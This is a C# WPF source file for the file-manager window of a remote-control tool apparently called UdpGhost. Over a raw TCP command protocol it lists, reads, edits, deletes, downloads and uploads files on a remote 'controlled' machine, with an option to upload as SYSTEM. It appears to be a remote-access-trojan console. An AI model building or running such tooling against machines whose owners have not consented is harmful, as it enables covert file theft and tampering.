using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using Microsoft.Win32;

namespace UdpGhost
{
    public partial class FileManagerWindow : Window
    {
        private readonly string _ip;
        private readonly int _cmdPort;
        private string _currentPath;

        public class FileItem
        {
            public string Name { get; set; }
            public string Size { get; set; }
            public string Time { get; set; }
            public bool IsDir { get; set; }
            public string FullPath { get; set; }
        }

        public FileManagerWindow(string ip, int cmdPort, string machineName)
        {
            InitializeComponent();
            _ip = ip;
            _cmdPort = cmdPort;
            Title = "远程文件管理 - " + machineName + " (" + ip + ")";
            _currentPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            PathBox.Text = _currentPath;
            LoadList();
        }

        private void LoadList()
        {
            try
            {
                string resp = SendCommand("FILE_LIST:" + _currentPath);
                FileList.Items.Clear();
                if (resp.StartsWith("ERROR"))
                {
                    StatusBar.Text = resp;
                    return;
                }
                string[] lines = resp.Split('\n');
                foreach (string line in lines)
                {
                    if (string.IsNullOrWhiteSpace(line)) continue;
                    string trimmed = line.TrimEnd('\r'); // 去掉被控端AppendLine残留的\r
                    string[] parts = trimmed.Split('|');
                    if (parts.Length < 4) continue;
                    var item = new FileItem
                    {
                        Name = parts[0],
                        Size = parts[1] == "<dir>" ? "<dir>" : FormatSize(long.Parse(parts[1])),
                        Time = parts[2],
                        IsDir = parts[3] == "D",
                        FullPath = parts[0] == ".." ? Directory.GetParent(_currentPath)?.FullName : Path.Combine(_currentPath, parts[0])
                    };
                    FileList.Items.Add(item);
                }
                StatusBar.Text = _currentPath + " | " + (FileList.Items.Count - 1) + " 项";
            }
            catch (Exception ex) { StatusBar.Text = "错误: " + ex.Message; }
        }

        private string FormatSize(long bytes)
        {
            if (bytes < 1024) return bytes + "B";
            if (bytes < 1024 * 1024) return (bytes / 1024.0).ToString("F1") + "KB";
            return (bytes / 1024.0 / 1024.0).ToString("F1") + "MB";
        }

        private string SendCommand(string cmd)
        {
            using (var client = new TcpClient())
            {
                client.ReceiveTimeout = 5000;
                client.Connect(_ip, _cmdPort);
                using (var stream = client.GetStream())
                {
                    byte[] data = Encoding.UTF8.GetBytes(cmd);
                    stream.Write(data, 0, data.Length);
                    stream.Flush();
                    // 读取响应(可能多行)
                    var ms = new MemoryStream();
                    byte[] buf = new byte[16384];
                    stream.ReadTimeout = 3000;
                    try
                    {
                        while (true)
                        {
                            int r = stream.Read(buf, 0, buf.Length);
                            if (r <= 0) break;
                            ms.Write(buf, 0, r);
                            if (r < buf.Length) break;
                        }
                    }
                    catch { }
                    return Encoding.UTF8.GetString(ms.ToArray()).Trim();
                }
            }
        }

        private void BtnUp_Click(object sender, RoutedEventArgs e)
        {
            var parent = Directory.GetParent(_currentPath);
            if (parent != null) { _currentPath = parent.FullName; PathBox.Text = _currentPath; LoadList(); }
        }

        private void BtnEnter_Click(object sender, RoutedEventArgs e)
        {
            var item = FileList.SelectedItem as FileItem;
            if (item == null) { MessageBox.Show("请先选择目录"); return; }
            if (!item.IsDir) { MessageBox.Show("选中的不是目录"); return; }
            if (item.FullPath == null) { MessageBox.Show("无法获取路径"); return; }
            _currentPath = item.FullPath;
            PathBox.Text = _currentPath;
            LoadList();
        }

        private void FileList_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            // 双击目录直接进入,文件双击无操作(下载走右键菜单或底部按钮)
            var item = FileList.SelectedItem as FileItem;
            if (item == null || !item.IsDir || item.FullPath == null) return;
            _currentPath = item.FullPath;
            PathBox.Text = _currentPath;
            LoadList();
        }

        private void BtnRefresh_Click(object sender, RoutedEventArgs e) { LoadList(); }

        private void PathBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                if (Directory.Exists(PathBox.Text) || PathBox.Text.StartsWith(@"C:\"))
                {
                    _currentPath = PathBox.Text;
                    LoadList();
                }
            }
        }

        private void Shortcut_Click(object sender, RoutedEventArgs e)
        {
            string tag = (sender as Button)?.Tag as string;
            switch (tag)
            {
                case "Desktop": _currentPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); break;
                case "Documents": _currentPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); break;
                case "Downloads": _currentPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"); break;
                case "Temp": _currentPath = Path.GetTempPath(); break;
                case "C:\\": _currentPath = "C:\\"; break;
            }
            PathBox.Text = _currentPath;
            LoadList();
        }

        private void MenuDownload_Click(object sender, RoutedEventArgs e)
        {
            var item = FileList.SelectedItem as FileItem;
            if (item == null || item.IsDir) { MessageBox.Show("请选择文件"); return; }
            DownloadFile(item);
        }

        private void MenuDelete_Click(object sender, RoutedEventArgs e)
        {
            var item = FileList.SelectedItem as FileItem;
            if (item == null || item.Name == "..") { MessageBox.Show("请选择文件或目录"); return; }
            if (MessageBox.Show("确认删除 " + item.Name + " ?", "确认", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
            string resp = SendCommand("FILE_DELETE:" + item.FullPath);
            MessageBox.Show(resp);
            LoadList();
        }

        private void MenuRefresh_Click(object sender, RoutedEventArgs e) { LoadList(); }

        private void MenuNewTxt_Click(object sender, RoutedEventArgs e)
        {
            string name = Microsoft.VisualBasic.Interaction.InputBox("输入txt文件名:", "新建txt", "新建文本文档.txt");
            if (string.IsNullOrWhiteSpace(name)) return;
            if (!name.EndsWith(".txt", StringComparison.OrdinalIgnoreCase)) name += ".txt";
            string fullPath = System.IO.Path.Combine(_currentPath, name);
            string resp = SendCommand("FILE_WRITE:" + fullPath + "|" + Convert.ToBase64String(Encoding.UTF8.GetBytes("")));
            MessageBox.Show(resp);
            LoadList();
        }

        private void MenuViewTxt_Click(object sender, RoutedEventArgs e)
        {
            var item = FileList.SelectedItem as FileItem;
            if (item == null || item.IsDir) { MessageBox.Show("请选择txt文件"); return; }
            if (!item.Name.EndsWith(".txt", StringComparison.OrdinalIgnoreCase)) { MessageBox.Show("请选择txt文件"); return; }
            try
            {
                string resp = SendCommand("FILE_READ:" + item.FullPath);
                if (resp.StartsWith("ERROR")) { MessageBox.Show(resp, "查看", MessageBoxButton.OK, MessageBoxImage.Error); return; }
                if (!resp.StartsWith("OK:")) { MessageBox.Show("协议错误: " + resp); return; }
                string b64 = resp.Substring(3);
                string text = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
                var win = new Window
                {
                    Title = "查看 - " + item.Name,
                    Width = 600, Height = 450,
                    WindowStartupLocation = WindowStartupLocation.CenterOwner,
                    Background = System.Windows.Media.Brushes.Black,
                    Foreground = System.Windows.Media.Brushes.LightGreen,
                    FontFamily = new System.Windows.Media.FontFamily("Consolas")
                };
                var txt = new TextBox
                {
                    Text = text,
                    IsReadOnly = true,
                    TextWrapping = TextWrapping.Wrap,
                    AcceptsReturn = true,
                    AcceptsTab = true,
                    VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                    Background = System.Windows.Media.Brushes.Black,
                    Foreground = System.Windows.Media.Brushes.LightGreen,
                    BorderThickness = new Thickness(0),
                    Margin = new Thickness(10),
                    FontFamily = new System.Windows.Media.FontFamily("Consolas"),
                    FontSize = 12
                };
                win.Content = txt;
                win.ShowDialog();
            }
            catch (Exception ex) { MessageBox.Show("读取失败: " + ex.Message); }
        }

        private void MenuEditTxt_Click(object sender, RoutedEventArgs e)
        {
            var item = FileList.SelectedItem as FileItem;
            if (item == null || item.IsDir) { MessageBox.Show("请选择txt文件"); return; }
            if (!item.Name.EndsWith(".txt", StringComparison.OrdinalIgnoreCase)) { MessageBox.Show("请选择txt文件"); return; }
            try
            {
                string resp = SendCommand("FILE_READ:" + item.FullPath);
                if (resp.StartsWith("ERROR")) { MessageBox.Show(resp, "编辑", MessageBoxButton.OK, MessageBoxImage.Error); return; }
                string b64 = resp.StartsWith("OK:") ? resp.Substring(3) : "";
                string text = b64.Length > 0 ? Encoding.UTF8.GetString(Convert.FromBase64String(b64)) : "";
                var win = new Window
                {
                    Title = "编辑 - " + item.Name,
                    Width = 600, Height = 450,
                    WindowStartupLocation = WindowStartupLocation.CenterOwner,
                    Background = System.Windows.Media.Brushes.Black
                };
                var grid = new Grid();
                grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
                grid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
                var txt = new TextBox
                {
                    Text = text,
                    TextWrapping = TextWrapping.Wrap,
                    AcceptsReturn = true,
                    AcceptsTab = true,
                    VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                    Background = System.Windows.Media.Brushes.Black,
                    Foreground = System.Windows.Media.Brushes.LightGreen,
                    BorderThickness = new Thickness(0),
                    Margin = new Thickness(10),
                    FontFamily = new System.Windows.Media.FontFamily("Consolas"),
                    FontSize = 12
                };
                Grid.SetRow(txt, 0);
                var btnSave = new Button
                {
                    Content = "保存",
                    Width = 80, Height = 28,
                    Margin = new Thickness(0, 0, 10, 10),
                    HorizontalAlignment = HorizontalAlignment.Right,
                    Background = System.Windows.Media.Brushes.DarkGreen,
                    Foreground = System.Windows.Media.Brushes.White
                };
                Grid.SetRow(btnSave, 1);
                btnSave.Click += (s, args) =>
                {
                    try
                    {
                        string newB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(txt.Text));
                        string saveResp = SendCommand("FILE_WRITE:" + item.FullPath + "|" + newB64);
                        MessageBox.Show(saveResp);
                        if (saveResp.StartsWith("OK")) win.Close();
                    }
                    catch (Exception ex) { MessageBox.Show("保存失败: " + ex.Message); }
                };
                grid.Children.Add(txt);
                grid.Children.Add(btnSave);
                win.Content = grid;
                win.ShowDialog();
                LoadList();
            }
            catch (Exception ex) { MessageBox.Show("打开失败: " + ex.Message); }
        }

        private void MenuInfo_Click(object sender, RoutedEventArgs e)
        {
            var item = FileList.SelectedItem as FileItem;
            if (item == null || item.Name == "..") { MessageBox.Show("请选择文件或目录"); return; }
            try
            {
                string resp = SendCommand("FILE_INFO:" + item.FullPath);
                if (resp.StartsWith("ERROR")) { MessageBox.Show(resp, "属性", MessageBoxButton.OK, MessageBoxImage.Error); return; }
                var sb = new StringBuilder();
                string[] lines = resp.Split('\n');
                foreach (string line in lines)
                {
                    if (string.IsNullOrWhiteSpace(line)) continue;
                    string trimmed = line.TrimEnd('\r');
                    int idx = trimmed.IndexOf('|');
                    if (idx > 0)
                    {
                        string key = trimmed.Substring(0, idx);
                        string val = trimmed.Substring(idx + 1);
                        sb.AppendLine(key + ": " + val);
                    }
                    else sb.AppendLine(trimmed);
                }
                MessageBox.Show(sb.ToString(), "属性 - " + item.Name, MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex) { MessageBox.Show("获取属性失败: " + ex.Message); }
        }

        private void BtnUpload_Click(object sender, RoutedEventArgs e)
        {
            var ofd = new OpenFileDialog { Title = "选择要上传的文件" };
            if (ofd.ShowDialog() != true) return;
            var fi = new FileInfo(ofd.FileName);
            if (fi.Length > 10 * 1024 * 1024) { MessageBox.Show("文件超过10MB限制"); return; }
            UploadFile(ofd.FileName, Path.Combine(_currentPath, fi.Name));
        }

        private void BtnDownload_Click(object sender, RoutedEventArgs e)
        {
            var item = FileList.SelectedItem as FileItem;
            if (item == null || item.IsDir) { MessageBox.Show("请选择文件"); return; }
            DownloadFile(item);
        }

        private void BtnDelete_Click(object sender, RoutedEventArgs e)
        {
            var item = FileList.SelectedItem as FileItem;
            if (item == null || item.Name == "..") { MessageBox.Show("请选择文件或目录"); return; }
            if (MessageBox.Show("确认删除 " + item.Name + " ?", "确认", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
            string resp = SendCommand("FILE_DELETE:" + item.FullPath);
            MessageBox.Show(resp);
            LoadList();
        }

        private void BtnMkdir_Click(object sender, RoutedEventArgs e)
        {
            string name = Microsoft.VisualBasic.Interaction.InputBox("输入文件夹名称:", "新建文件夹", "新建文件夹");
            if (string.IsNullOrWhiteSpace(name)) return;
            string resp = SendCommand("FILE_MKDIR:" + Path.Combine(_currentPath, name));
            MessageBox.Show(resp);
            LoadList();
        }

        private void UploadFile(string localPath, string remotePath)
        {
            try
            {
                byte[] data = File.ReadAllBytes(localPath);
                string param = remotePath + ":" + data.Length;
                if (ChkSystem.IsChecked == true) param += ":SYSTEM";

                using (var client = new TcpClient())
                {
                    client.Connect(_ip, _cmdPort);
                    using (var stream = client.GetStream())
                    {
                        WriteStr(stream, "FILE_UPLOAD:" + param);
                        string resp = ReadStr(stream);
                        if (resp == "EXISTS")
                        {
                            if (MessageBox.Show("文件已存在，是否覆盖?", "确认", MessageBoxButton.YesNo) != MessageBoxResult.Yes)
                            { WriteStr(stream, "END"); return; }
                            WriteStr(stream, "FILE_UPLOAD:" + param + ":OVERWRITE");
                            resp = ReadStr(stream);
                        }
                        if (resp != "READY") { MessageBox.Show("上传失败: " + resp); return; }

                        // 分块上传
                        int blockSize = 4096;
                        int seq = 0;
                        for (int i = 0; i < data.Length; i += blockSize)
                        {
                            int len = Math.Min(blockSize, data.Length - i);
                            byte[] block = new byte[len];
                            Array.Copy(data, i, block, 0, len);
                            WriteStr(stream, "DATA:" + seq + ":" + Convert.ToBase64String(block));
                            seq++;
                        }
                        WriteStr(stream, "END");
                        string result = ReadStr(stream);
                        MessageBox.Show(result);
                        LoadList();
                    }
                }
            }
            catch (Exception ex) { MessageBox.Show("上传错误: " + ex.Message); }
        }

        private void DownloadFile(FileItem item)
        {
            try
            {
                var sfd = new SaveFileDialog { FileName = item.Name };
                if (sfd.ShowDialog() != true) return;

                using (var client = new TcpClient())
                {
                    client.Connect(_ip, _cmdPort);
                    using (var stream = client.GetStream())
                    {
                        WriteStr(stream, "FILE_DOWNLOAD:" + item.FullPath);
                        string line = ReadStr(stream);
                        if (line == null || line.StartsWith("ERROR")) { MessageBox.Show("下载失败: " + line); return; }
                        if (!line.StartsWith("SIZE:")) { MessageBox.Show("协议错误: " + line); return; }
                        long totalSize = long.Parse(line.Substring(5));

                        using (var fs = new FileStream(sfd.FileName, FileMode.Create, FileAccess.Write))
                        {
                            while (true)
                            {
                                line = ReadStr(stream);
                                if (line == null || line == "END") break;
                                if (line.StartsWith("DATA:"))
                                {
                                    int colon1 = line.IndexOf(':', 5);
                                    string b64 = line.Substring(colon1 + 1);
                                    byte[] block = Convert.FromBase64String(b64);
                                    fs.Write(block, 0, block.Length);
                                }
                            }
                        }
                        MessageBox.Show("下载完成: " + sfd.FileName);
                    }
                }
            }
            catch (Exception ex) { MessageBox.Show("下载错误: " + ex.Message); }
        }

        private void WriteStr(NetworkStream stream, string s)
        {
            byte[] data = Encoding.UTF8.GetBytes(s + "\n");
            stream.Write(data, 0, data.Length);
            stream.Flush();
        }

        private string ReadStr(NetworkStream stream)
        {
            var ms = new MemoryStream();
            byte[] buf = new byte[1];
            while (true)
            {
                int r = stream.Read(buf, 0, 1);
                if (r <= 0) return null;
                if (buf[0] == (byte)'\n') break;
                ms.WriteByte(buf[0]);
            }
            return Encoding.UTF8.GetString(ms.ToArray()).Trim();
        }
    }
}
